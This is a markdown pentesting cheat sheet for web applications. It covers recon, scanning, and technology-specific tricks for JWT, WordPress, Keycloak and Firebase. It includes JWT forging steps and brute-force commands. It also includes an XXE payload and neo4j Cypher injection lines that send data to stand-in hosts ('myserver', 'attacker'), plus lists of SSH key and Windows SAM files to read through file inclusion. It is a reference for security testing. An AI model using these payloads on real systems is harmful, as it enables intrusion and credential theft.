# web

## web app methodology
### explore app like a normal user
- save interesting points and possible attacks
    - blind xss
    - brute
    - idor

### identify technologies 
- headers / cookies
- file extensions
- provoke descriptive errors
- tools (wappalyzer, whatweb, whatruns)
- https://webanalyzer.me/
- builtwith.com
- searchdns.netcraft.com
- stackshare.io

### search exploits manually to the technology
- [searching exploits](external.md#exploitation)

### information gathering
- [information gathering](external.md#information-gathering---step-1)
- check how web site look like in web archive

#### gathering users, emails, cpfs
- search engine "@company"
- theHarvester
- hunter.io, www.skymem.info, phonebook.cz
- look for passwords / hashes in leaked databases 
- [jbr_query.sh](jbr_query.sh)

### automated scan
- nuclei, burp
- `wpscan --random-user-agent --enumerate vp --plugins-detection aggressive --url example.com -o output.txt`
- ~nikto, wapiti~
- ?oneforall
- ?rengine

### path fuzzing
- passive path fuzzing
    - web.archive.org
        - `curl 'https://web.archive.org/cdx/search?url=site.com.br&matchType=domain&fl=original&collapse=original&output=text&limit=100000' | sort -u`
    - robots on webarchive
    - search for "http" in reclameaqui
    - google/bing
    - https://urlscan.io/
    - ?virustotal
    - analisar codigo client-side
        - TODO: add tool
- active path fuzzing
    - brute force with session token
    - generate a wordlist https://gist.github.com/morkin1792/6f7d25599d1d1779e41cdf035938a28e
    - ?cewl

### js sensitive information analysis
- look for comments in html
- ? `wget -mkEp -e robots=off`
- https://github.com/m4ll0k/SecretFinder
- https://github.com/i5nipe/nipejs
- if find api key
    - https://github.com/streaak/keyhacks
    - `nuclei -t http/token-spray/ -var token=ABC`

### manual tests
- check [api.md](api.md)
- check [app_functionalities.md](app_functionalities.md)

### bypass WAF/api gateway
- accessing the server's ip address directly, check [ip address history](external.md#information-gathering---step-2)

## web technologies

### JWT
- a JWT is a specific type of a JWS (if it is signed) or a JWE (if it is encrypted)
    - https://datatracker.ietf.org/doc/html/rfc7519
    - not all JWSs are JWTs
        - the JWS payload don't need to be a JSON as in the JWT
        - JWS has 2 formats: Compact Serialization (used by JWT) and JSON Serialization
        - https://datatracker.ietf.org/doc/html/rfc7515
- signature exclusion
    - "alg": "none"
- key confusion 
    - change RS256 (RSA, asymmetric) to HS256 (HMAC, symmetric) and use pub key to sign
    - 1) <pre> openssl s_client -showcerts -connect target.com:443 certs.pem && csplit -z -f 'cert' -b '%02d.pub' certs.pem '/BEGIN/' '{*}' && rm certs.pem && find . -maxdepth 1 -name "*.pub" -exec sh -c "openssl x509 -in {} -pubkey > {}.pem" \; && rm *.pub</pre>
    - 2) ```JOSEPH``` or ```pip install pyjwt==0.4.3```
    - 3) import jwt; print(jwt.encode({"data":"test"}, key=open("public.pem", "r").read(), algorithm="HS256"))
- brute
    - hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a


### java
- ACL bypass
    * /foo../restrict
    * /foo;/restrict
    * scenario: nginx as reverse proxy of tomcat app
- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
- Log4Shell (CVE-2021-44228)
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md#payloads

### spring
- check /actuator
    - [spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)
    - visualvm

### asp.net
```
TODO
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services
https://www.youtube.com/watch?v=HrJW6Y9kHC4
https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/
https://paulmuellersec.files.wordpress.com/2021/06/asp.netcryptocheatsheet.pdf
http://phototor.com/2019/02/04/microsoft-iis-rce-vulnerability-cve-2017-7269/
```

### glpi 
- files/_log/

### wordpress
- login brute force: `wpscan --url example.com -u admin -P wordlist.txt`
- brute enumerate users: `wpscan --url example.com --enumerate u 1-100`

- useful paths
```
/wp-json/wp/v2/users      # get all users
/?rest_route=/wp/v2/users # 

/wp-content/uploads/2023/ # upload directory

/wp-login.php             # login page
/login
/wp-admin
/admin
```

### http authentication
- search technology
- search unprotected paths
- brute force in creds

### firebase
- example.firebaseio.com/.json
    https://pentestguy.in/pentesting-insecure-firebase-bugbounty-penetration-testing/
- ?fuzzing tables names, ex: example.firebaseio.com/Users.json 

### .git
- try clone / extract files
    * https://github.com/WangYihang/GitHacker
    * https://github.com/kost/dvcs-ripper
    * https://github.com/internetwache/GitTools
    * https://github.com/arthaud/git-dumper


### keycloak
- Try register replacing `auth` by `registrations` in the URL.
- REALM_NAME='master' -> check too the original realm_name from app
- /auth/realms/{REALM_NAME} -> pubkey to try downgrade attack
- /auth/realms/{REALM_NAME}/account -> admin interface
- /auth/realms/{REALM_Name}/.well-known/openid-configuration
- /auth/realms/{REALM_Name}/protocol/openid-connect/certs
- /auth/realms/{REALM_Name}/protocol/openid-connect/logout?redirect_uri=

### f5 big-ip tmui
- https://github.com/yassineaboukir/CVE-2020-5902



## web vulnerabilities

### SQLi
- https://sqlwiki.netspi.com/#mysql
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- [sqli](concepts/sqli.md)

### XSS
- https://gist.github.com/morkin1792/8c9d2f1095d803b075e7a5a9e2aadea7 
- XSStrike
- dalfox

### XXE
    - read file: 1) eval 2) ?CDATA 3) php://
```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://myserver/a.dtd">
    %xxe;
]>
```

```xml
<!ENTITY % content SYSTEM "\\server\share\sites\example.com\api\web.config">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://myserver?%content;'>">
%eval;
%send;
```

### neo4j cypher injection
```
 LOAD CSV FROM 'https://attacker' as yl
 LOAD CSV FROM 'https://attacker' as yl//
})LOAD CSV FROM 'https://attacker' as yl
})LOAD CSV FROM 'https://attacker' as yl//
' LOAD CSV FROM 'https://attacker' as yl MATCH(:Z) WHERE '3'='3
' LOAD CSV FROM 'https://attacker' as yl//
'})LOAD CSV FROM 'https://attacker' as yl MATCH(:Z{w:'3
'})LOAD CSV FROM 'https://attacker' as yl//
" LOAD CSV FROM 'https://attacker' as yl MATCH(:Z) WHERE "3"="3
" LOAD CSV FROM 'https://attacker' as yl//
"})LOAD CSV FROM 'https://attacker' as yl MATCH(:Z{w:"3
"})LOAD CSV FROM 'https://attacker' as yl//
```

### SSRF
- [cloud metadata service address](cloud.md)
- ntlm relay && brute ntlm response
- brute hosts (leaked internal ips)
- path fuzzing
- cve no client http
- https://brightsec.com/blog/ssrf-server-side-request-forgery/
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### reading internal files

#### linux
```
/home/$USER/.ssh/id_rsa
/home/$USER/.ssh/id_dsa
/home/$USER/.ssh/id_ecdsa
/home/$USER/.ssh/identity
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/identity
```
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

#### windows
```
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Users\$USER\.ssh\id_rsa
c:\windows\system32\drivers\etc\hosts
c:\Windows\repair\SAM
c:\Windows\repair\system
c:\Windows\System32\config\SAM
c:\Windows\System32\config\SYSTEM
c:\Windows\System32\config\RegBack\SAM
c:\Windows\System32\config\RegBack\system
c:\Windows\System32\config\RegBack\SAM.OLD
c:\Windows\System32\config\RegBack\SYSTEM.OLD
c:\windows\debug\netsetup.log
c:\windows\system.ini
c:\windows\win.ini
```
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

#### general
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-linux-and-windows_by-1N3%40CrowdShield.txt
```
file:///etc/passwd?/../../windows/win.ini
```
- enumerate users and then do a brute force (reading passwd, /home, C:/users)
- try list directories
- read leaked paths (descriptive errors)
    - brute to internal files
- php://input
- get ntlm response using UNC path (\\attackerServer\share)
- gopher
- what search internal? https://medium.com/@warrenbutterworth/oob-xxe-to-ssrf-to-windows-administrator-hashes-1f8ccd910624
